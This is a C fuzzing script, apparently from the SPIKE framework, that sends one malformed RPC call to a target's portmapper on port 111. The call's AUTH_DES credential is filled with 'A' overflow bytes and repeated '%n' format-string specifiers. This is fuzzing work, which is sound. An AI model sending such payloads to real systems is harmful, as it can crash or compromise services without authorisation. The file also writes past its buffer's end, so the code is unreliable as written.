/* 
   ss_spike.c

   Include routines for spiking the sun RPC portmapper.

   Not real interesting. But maybe useful some day. This was done
   more of a test of the API than anything else.

 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include "spike.h"
#include "hdebug.h"
#include "tcpstuff.h"



void
usage()
{
  fprintf(stderr,"Usage: pmspike target\n");
  exit(-1);
}

int
main (int argc, char ** argv)
{
  char * target;
  char buffer[1500000];

  struct spike * our_spike;
  unsigned long retval;

  if (argc!=2)
    {
      usage();
    }

  target=argv[1];
  printf("Target is %s\n",argv[1]);

  our_spike=new_spike();


  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\n");
      exit(-1);
    }

  setspike(our_spike);

  memset(buffer,0x41,sizeof(buffer));
  buffer[sizeof(buffer)]=0;
  memcpy(buffer,"%n%n%n%n%n%n%n%n%n%n%n%n",strlen("%n%n%n%n%n%n%n%n%n%n%n%n"));
  buffer[5001]=0;

  /*last fragment and fragment length*/
  /*s_binary("80000028");*/
  /*this sets the flag for "final fragment" correctly*/
  s_binary_block_size_word_bigendian_plussome("packet",0x80000000);  
  s_block_start("packet");
  /*XID*/
  s_binary("0x47ec59b0"); /*random number...*/
  s_bigword(0); /*message type: call (0)*/
  s_bigword(2); /*rpc version 2*/
  s_bigword(100000); /*program number*/
  s_bigword(2); /*program version*/
  s_bigword(4); /*procedure 5*/
  /*
    0=auth null
    1=auth unix
    2=auth short 
    3=auth des
  */
  s_bigword(3); /*cred: flavor*/

  /*
    AUTHUNIX BLOCK
  */
  /*
  s_binary_block_size_word_bigendian("UnixAuth");
  s_block_start("UnixAuth");
  s_bigword(0); //stamp
  s_xdr_string(buffer); //must be length % 4=0
  s_bigword(0); //UID
  s_block_end("UnixAuth");
  */

  /*
    AUTHDES BLOCK
  */
  s_binary_block_size_word_bigendian("Auth");
  s_block_start("Auth");
  s_bigword(1); //namekind: ADN_FULLNAME - 0, fullname 1, nickname
  s_xdr_string(buffer);
  //conversation key
  s_binary("0x0102030405060708"); 
  //window
  s_binary("0x11121314"); 
  /* */

  s_block_end("Auth");


  s_xdr_string(buffer);
  s_block_end("packet");
  

  /*
  s_print_buffer();
  s_printf_buffer();
  */

  if (spike_send_tcp(target,111)<0)
    {
      printf("Couldn't connect to host or send data!\n");
      exit(-1);
    }
  retval=tcpread(our_spike->fd,1000,buffer);
  printf("Buffer[%d]=*%s*\n",(int)retval,buffer);
  return 0;
}







